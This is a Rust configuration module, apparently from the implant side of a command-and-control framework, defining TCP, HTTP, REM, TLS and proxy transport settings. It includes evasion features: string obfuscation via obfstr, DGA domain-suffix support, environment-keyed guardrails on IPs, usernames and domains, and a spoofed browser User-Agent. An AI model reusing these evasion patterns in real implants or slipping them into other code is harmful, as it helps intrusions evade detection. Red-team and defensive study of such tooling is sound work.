use malefic_gateway::obfstr::obfstr;
use malefic_gateway::ObfDebug;
use std::collections::HashMap;
use std::time::Duration;
// ============= Unified Configuration Structure =============
#[derive(ObfDebug, Clone, PartialEq)]
pub struct SessionConfig {
    pub read_chunk_size: usize,
    pub deadline: Duration,
    pub connect_timeout: Duration,
    pub keepalive: bool,
}

#[derive(ObfDebug, Clone, PartialEq)]
pub struct ServerConfig {
    pub address: String,
    pub protocol: ProtocolType,
    pub session_config: SessionConfig,
    pub transport_config: TransportConfig,
    pub tls_config: Option<TlsConfig>,
    pub proxy_config: Option<ProxyConfig>,
    pub domain_suffix: Option<String>,
}

#[derive(ObfDebug, Clone, PartialEq)]
pub enum ProtocolType {
    Tcp,
    Http,
    REM,
    Other(String),
}

#[derive(ObfDebug, Clone, PartialEq)]
pub enum TransportConfig {
    Tcp(TcpConfig),
    Http(HttpRequestConfig),
    Rem(RemConfig),
    Opaque(String),
}

// ============= TCP Configuration Structure =============

#[derive(ObfDebug, Clone, PartialEq)]
pub struct TcpConfig {
    // TCP-specific configuration can be added here
    // pub socket_options: Option<SocketOptions>,
}

#[derive(ObfDebug, Clone, PartialEq)]
pub struct SocketOptions {
    pub nodelay: bool,
    pub reuse_addr: bool,
    pub send_buffer_size: Option<usize>,
    pub recv_buffer_size: Option<usize>,
}

// ============= HTTP Configuration Structure =============

#[derive(ObfDebug, Clone, PartialEq)]
pub struct HttpRequestConfig {
    pub method: String,
    pub path: String,
    pub version: String,
    pub headers: HashMap<String, String>, // Contains all HTTP headers
    pub response_read_chunk_size: usize,
    pub response_retry_delay: Duration,
}

// ============= REM Configuration Structure =============

#[derive(ObfDebug, Clone, PartialEq)]
pub struct RemConfig {
    pub link: String,
}

pub const DEFAULT_STREAM_READ_CHUNK_SIZE: usize = 8 * 1024;
const DEFAULT_STREAM_DEADLINE: Duration = Duration::from_secs(3);
const DEFAULT_STREAM_CONNECT_TIMEOUT: Duration = Duration::from_secs(3);

const DEFAULT_REM_INTERVAL: Duration = Duration::from_secs(5);
const DEFAULT_REM_SESSION_DEADLINE_FACTOR: u32 = 10;
const DEFAULT_REM_CONNECT_TIMEOUT_FACTOR: u32 = 20;

const DEFAULT_HTTP_RESPONSE_READ_CHUNK_SIZE: usize = 8 * 1024;
const DEFAULT_HTTP_RESPONSE_RETRY_DELAY: Duration = Duration::from_millis(10);

// ============= Common Configuration Structure =============

#[derive(ObfDebug, Clone, PartialEq)]
pub struct MTLSConfig {
    /// Enable mTLS
    pub enable: bool,
    pub client_cert: Vec<u8>,
    pub client_key: Vec<u8>,
    pub server_ca: Vec<u8>,
}

#[derive(ObfDebug, Clone, PartialEq)]
pub struct TlsConfig {
    pub enable: bool,
    pub version: String,
    pub sni: String,
    pub skip_verification: bool,
    pub server_ca: Vec<u8>,
    pub mtls_config: Option<MTLSConfig>,
}

#[derive(ObfDebug, Clone, PartialEq)]
pub struct ProxyConfig {
    pub proxy_type: String,
    pub host: String,
    pub port: u16,
    pub username: String,
    pub password: String,
}

// ============= Guardrail Configuration Structure =============

#[derive(ObfDebug, Clone, PartialEq)]
pub struct GuardrailConfig {
    pub ip_addresses: Vec<String>,
    pub usernames: Vec<String>,
    pub server_names: Vec<String>,
    pub domains: Vec<String>,
    pub require_all: bool,
}

// ============= Implementation Methods =============

// impl Default for TcpConfig {
//     fn default() -> Self {
//         Self {
//         }
//     }
// }

impl SessionConfig {
    pub fn new(
        read_chunk_size: usize,
        deadline: Duration,
        connect_timeout: Duration,
        keepalive: bool,
    ) -> Self {
        Self {
            read_chunk_size,
            deadline,
            connect_timeout,
            keepalive,
        }
    }

    pub fn default_for_transport(transport: &TransportConfig, keepalive: bool) -> Self {
        match transport {
            TransportConfig::Rem(rem) => Self::rem_default(rem, keepalive),
            TransportConfig::Tcp(_) | TransportConfig::Http(_) | TransportConfig::Opaque(_) => {
                Self::stream_default(keepalive)
            }
        }
    }

    pub fn stream_default(keepalive: bool) -> Self {
        Self::new(
            DEFAULT_STREAM_READ_CHUNK_SIZE,
            DEFAULT_STREAM_DEADLINE,
            DEFAULT_STREAM_CONNECT_TIMEOUT,
            keepalive,
        )
    }

    pub fn rem_default(rem: &RemConfig, keepalive: bool) -> Self {
        let deadline = rem.default_session_deadline();
        Self::new(
            DEFAULT_STREAM_READ_CHUNK_SIZE,
            deadline,
            rem.default_connect_timeout(),
            keepalive,
        )
    }
}

impl HttpRequestConfig {
    pub fn new(method: &str, path: &str, version: &str) -> Self {
        let mut headers = HashMap::new();
        headers.insert(
            obfstr!("Connection").to_string(),
            obfstr!("close").to_string(),
        );
        headers.insert(
            obfstr!("User-Agent").to_string(),
            obfstr!("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36").to_string(),
        );
        headers.insert(
            obfstr!("Content-Type").to_string(),
            obfstr!("application/octet-stream").to_string(),
        );

        Self {
            method: method.to_string(),
            path: path.to_string(),
            version: version.to_string(),
            headers,
            response_read_chunk_size: DEFAULT_HTTP_RESPONSE_READ_CHUNK_SIZE,
            response_retry_delay: DEFAULT_HTTP_RESPONSE_RETRY_DELAY,
        }
    }

    pub fn with_header(mut self, key: &str, value: &str) -> Self {
        self.headers.insert(key.to_string(), value.to_string());
        self
    }

    pub fn with_runtime_tuning(
        mut self,
        response_read_chunk_size: usize,
        response_retry_delay: Duration,
    ) -> Self {
        self.response_read_chunk_size = response_read_chunk_size;
        self.response_retry_delay = response_retry_delay;
        self
    }

    pub fn build_request(&self, content_length: usize) -> String {
        let mut request = format!("{} {} HTTP/{}\r\n", self.method, self.path, self.version);

        if content_length > 0 {
            request.push_str(&format!(
                "{}: {}\r\n",
                obfstr!("Content-Length"),
                content_length
            ));
        }

        for (key, value) in &self.headers {
            request.push_str(&format!("{}: {}\r\n", key, value));
        }

        request.push_str("\r\n");
        request
    }
}

impl RemConfig {
    pub fn new(link: String) -> Self {
        Self { link }
    }

    pub fn interval(&self) -> Duration {
        parse_duration_query_ms(&self.link, "interval").unwrap_or(DEFAULT_REM_INTERVAL)
    }

    /// Default session-layer idle deadline derived from the REM poll interval.
    ///
    /// This is only used when the caller omits an explicit `ServerConfig.session_config`.
    pub fn default_session_deadline(&self) -> Duration {
        scale_duration(self.interval(), DEFAULT_REM_SESSION_DEADLINE_FACTOR)
    }

    /// Default connection/handshake timeout derived from the REM poll interval.
    ///
    /// This is only used when the caller omits an explicit `ServerConfig.session_config`.
    pub fn default_connect_timeout(&self) -> Duration {
        scale_duration(self.interval(), DEFAULT_REM_CONNECT_TIMEOUT_FACTOR)
    }
}

fn parse_duration_query_ms(link: &str, key: &str) -> Option<Duration> {
    let millis = parse_u64_query(link, key)?;
    if millis == 0 {
        None
    } else {
        Some(Duration::from_millis(millis))
    }
}

fn parse_u64_query(link: &str, key: &str) -> Option<u64> {
    let needle = format!("{key}=");
    let start = link.find(&needle)? + needle.len();
    let digits: String = link[start..]
        .chars()
        .take_while(|c| c.is_ascii_digit())
        .collect();
    digits.parse::<u64>().ok()
}

fn scale_duration(duration: Duration, factor: u32) -> Duration {
    let millis = duration.as_millis();
    let scaled = millis.saturating_mul(factor as u128);
    let capped = scaled.min(u64::MAX as u128) as u64;
    Duration::from_millis(capped)
}

impl ServerConfig {
    /// Check if DGA is supported
    pub fn supports_dga(&self) -> bool {
        self.domain_suffix.is_some()
    }

    /// Get domain suffix
    pub fn get_domain_suffix(&self) -> Option<&String> {
        self.domain_suffix.as_ref()
    }

    /// Check if address is an IP address
    pub fn is_ip_address(&self) -> bool {
        if let Some(colon_pos) = self.address.rfind(':') {
            let host = &self.address[..colon_pos];
            host.parse::<std::net::IpAddr>().is_ok()
        } else {
            self.address.parse::<std::net::IpAddr>().is_ok()
        }
    }

    /// Get host address (without port)
    pub fn get_host(&self) -> String {
        if let Some(colon_pos) = self.address.rfind(':') {
            self.address[..colon_pos].to_string()
        } else {
            self.address.clone()
        }
    }

    /// Get port
    pub fn get_port(&self) -> String {
        if let Some(colon_pos) = self.address.rfind(':') {
            self.address[colon_pos..].to_string()
        } else {
            obfstr!(":443").to_string()
        }
    }
}
